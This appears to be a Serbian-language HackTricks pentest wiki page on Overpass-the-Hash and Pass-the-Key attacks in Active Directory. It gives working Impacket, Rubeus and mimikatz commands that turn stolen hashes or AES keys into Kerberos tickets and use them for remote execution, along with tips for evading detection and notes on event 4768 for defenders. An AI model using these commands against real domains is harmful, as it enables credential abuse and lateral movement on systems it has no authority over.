# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** attack je osmišljen za okruženja u kojima je tradicionalni NTLM protocol ograničen, a Kerberos authentication ima prednost. Ovaj attack koristi NTLM hash ili AES keys korisnika da zatraži Kerberos tickets, omogućavajući neovlašćen access resursima unutar networka.

U strogom smislu:

- **Over-Pass-the-Hash** obično znači pretvaranje **NT hash**-a u Kerberos TGT preko **RC4-HMAC** Kerberos key.
- **Pass-the-Key** je opštija verzija gde već imate Kerberos key, kao što je **AES128/AES256**, i direktno tražite TGT pomoću njega.

Ova razlika je važna u hardened environmentima: ako je **RC4 disabled** ili više nije pretpostavljen od strane KDC-a, **sam NT hash nije dovoljan** i potreban vam je **AES key** (ili cleartext password da biste ga izveli).

Da biste izvršili ovaj attack, početni korak uključuje pribavljanje NTLM hash-a ili passworda naloga ciljanog korisnika. Nakon obezbeđivanja ove informacije, može se dobiti Ticket Granting Ticket (TGT) za nalog, što napadaču omogućava access servisima ili mašinama za koje korisnik ima permissions.

Proces se može pokrenuti sledećim komandama:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Za scenarije koji zahtevaju AES256, može se koristiti opcija `-aesKey [AES key]`:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` takođe podržava zahtev za **service ticket** direktno kroz **AS-REQ** sa `-service <SPN>`, što može biti korisno kada želiš ticket za određeni SPN bez dodatnog TGS-REQ:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Štaviše, dobijeni ticket može da se koristi sa različitim alatima, uključujući `smbexec.py` ili `wmiexec.py`, čime se širi opseg napada.

Problemi poput _PyAsn1Error_ ili _KDC cannot find the name_ se obično rešavaju ažuriranjem Impacket biblioteke ili korišćenjem hostname-a umesto IP adrese, čime se obezbeđuje kompatibilnost sa Kerberos KDC.

Alternativni niz komandi koristeći Rubeus.exe pokazuje još jedan aspekt ove tehnike:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Ovaj metod odražava pristup **Pass the Key**, sa fokusom na preuzimanje i korišćenje tiketa direktno za potrebe autentifikacije. U praksi:

- `Rubeus asktgt` šalje **raw Kerberos AS-REQ/AS-REP** sam po sebi i **ne treba** mu admin prava osim ako želiš da ciljaš drugi logon session sa `/luid` ili da napraviš poseban sa `/createnetonly`.
- `mimikatz sekurlsa::pth` patchuje credential material u logon session i zato **dotiče LSASS**, što obično zahteva local admin ili `SYSTEM` i upadljivije je iz EDR perspektive.

Primeri sa Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Da bi se uskladilo sa operational security i koristio AES256, može se primeniti sledeća komanda:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` je relevantan zato što se traffic koji generiše Rubeus malo razlikuje od nativnog Windows Kerberos. Takođe imaj na umu da je `/opsec` namenjen za **AES256** traffic; njegovo korišćenje sa RC4 obično zahteva `/force`, što u velikoj meri poništava poentu jer je **RC4 u modernim domenima sam po sebi jak signal**.

## Detection notes

Svaki TGT request generiše **event `4768`** na DC-u. U aktuelnim Windows buildovima ovaj event sadrži korisnija polja nego što stariji tekstovi navode:

- `TicketEncryptionType` pokazuje koji je enctype korišćen za izdati TGT. Tipične vrednosti su `0x17` za **RC4-HMAC**, `0x11` za **AES128**, i `0x12` za **AES256**.
- Ažurirani eventi takođe izlažu `SessionKeyEncryptionType`, `PreAuthEncryptionType`, i advertised enctypes klijenta, što pomaže da se razlikuje **stvarna RC4 zavisnost** od zbunjujućih legacy podrazumevanih vrednosti.
- Ako vidiš `0x17` u modernom okruženju, to je dobar trag da nalog, host, ili KDC fallback path i dalje dozvoljava RC4 i zato je pogodniji za NT-hash-based Over-Pass-the-Hash.

Microsoft postepeno smanjuje RC4-by-default ponašanje od November 2022 Kerberos hardening updates, a trenutno objavljena preporuka je da se **ukloni RC4 kao podrazumevani pretpostavljeni enctype za AD DCs do kraja Q2 2026**. Sa ofanzivne strane, to znači da je **Pass-the-Key sa AES** sve češće pouzdan put, dok će klasični **NT-hash-only OpTH** sve češće failovati u hardenovanim okruženjima.

Za više detalja o Kerberos encryption types i related ticketing behaviour, pogledaj:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Svaka logon session može imati samo jedan aktivan TGT u isto vreme, zato budi pažljiv.

1. Kreiraj novu logon session sa **`make_token`** iz Cobalt Strike.
2. Zatim, koristi Rubeus da generiše TGT za novu logon session bez uticaja na postojeću.

Možeš postići sličnu izolaciju i direktno iz Rubeus-a sa žrtvenom **logon type 9** session:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Ovo izbegava prepisivanje trenutnog session TGT i obično je bezbednije nego importovanje tiketa u vašu postojeću logon session.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
